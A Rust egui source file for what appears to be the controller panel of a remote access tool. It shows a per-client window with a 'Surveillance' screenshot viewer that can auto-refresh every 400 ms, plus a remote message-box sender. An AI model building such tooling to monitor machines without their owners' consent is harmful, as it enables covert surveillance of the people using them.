use crate::manager::types::UiManagerCommand;
use egui::{CollapsingHeader, Color32, ColorImage, Context, Frame, Image, Margin, Stroke, Window};
use shared::commands::{Command, ComputerInfoResponse, MessageBoxArgs};
use std::time::Instant;
use tokio::sync::mpsc::UnboundedSender;

pub struct MsgboxView {
    pub title: String,
    pub text: String,
}
impl Default for MsgboxView {
    fn default() -> Self {
        Self {
            title: String::from("Title"),
            text: String::from("Text"),
        }
    }
}

pub struct ClientViewState {
    pub visible: bool,
    pub screen: Option<ColorImage>,
    pub update_screen: bool,
    pub last_screen: Option<Instant>,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub state: ClientViewState,
    //  pub socket: String, // socket
    pub info: ComputerInfoResponse,
    sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        /*socket: String,*/ mutex: String,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            state: ClientViewState {
                visible: false,

                screen: None,
                update_screen: false,
                last_screen: None,

                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}

pub fn render(ctx: &Context, view: &mut ClientView) {
    Window::new(view.info.hostname.clone())
        .open(&mut view.state.visible)
        .resizable(true)
        .show(ctx, |ui| {
            CollapsingHeader::new("Surveillance")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("Screen")
                        .default_open(false)
                        .show(ui, |ui| {
                            if let Some(ref image) = view.state.screen {
                                let texture_handle = ui.ctx().load_texture(
                                    format!("capture_{}", view.mutex),
                                    image.clone(),
                                    Default::default(),
                                );
                                let available_size = ui.available_size();
                                let image_size = texture_handle.size_vec2();
                                let max_width = available_size.x.min(720.0);
                                let max_height = available_size.y.min(560.0);

                                let scale_x = max_width / image_size.x;
                                let scale_y = max_height / image_size.y;
                                let scale = scale_x.min(scale_y).min(1.0);

                                let display_size = image_size * scale;
                                ui.add(Image::new(&texture_handle).max_size(display_size));
                            } else {
                                ui.label("Click 'Update' to load");
                            }

                            ui.horizontal(|ui| {
                                if ui.button("Update").clicked() {
                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
                                        view.mutex.clone(),
                                        Command::Screenshot,
                                    ));
                                }

                                let checkbox = ui.checkbox(
                                    &mut view.state.update_screen,
                                    "Update automatically",
                                );
                                if checkbox.changed() {
                                    if view.state.update_screen {
                                        // just checked
                                        let _ = view.sender.send(UiManagerCommand::SendCommand(
                                            view.mutex.clone(),
                                            Command::Screenshot,
                                        ));
                                        view.state.last_screen = Some(Instant::now());
                                    } else {
                                        // just unchecked
                                        view.state.last_screen = None;
                                    }
                                }
                            });

                            if view.state.update_screen {
                                if let Some(last_request_time) = view.state.last_screen {
                                    if last_request_time.elapsed()
                                        >= std::time::Duration::from_millis(400)
                                    {
                                        let _ = view.sender.send(UiManagerCommand::SendCommand(
                                            view.mutex.clone(),
                                            Command::Screenshot,
                                        ));
                                        view.state.last_screen = Some(Instant::now());
                                    }
                                }
                            }
                        });
                });
            CollapsingHeader::new("Utility")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("MessageBox")
                        .default_open(false)
                        .show(ui, |ui| {
                            ui.text_edit_singleline(&mut view.state.msgbox.title);
                            ui.text_edit_multiline(&mut view.state.msgbox.text);

                            if ui.button("Send").clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::MessageBox(MessageBoxArgs {
                                        title: view.state.msgbox.title.clone(),
                                        text: view.state.msgbox.text.clone(),
                                    }),
                                ));
                            }
                        })
                });

            let disconnect = eframe::egui::Button::new("Disconnect")
                .fill(Color32::DARK_RED)
                .stroke(Stroke::new(1.0, Color32::BLACK));
            Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
                if ui.add(disconnect).clicked() {
                    let _ = view
                        .sender
                        .send(UiManagerCommand::Disconnect(view.mutex.clone()));
                }
            })
        });
}
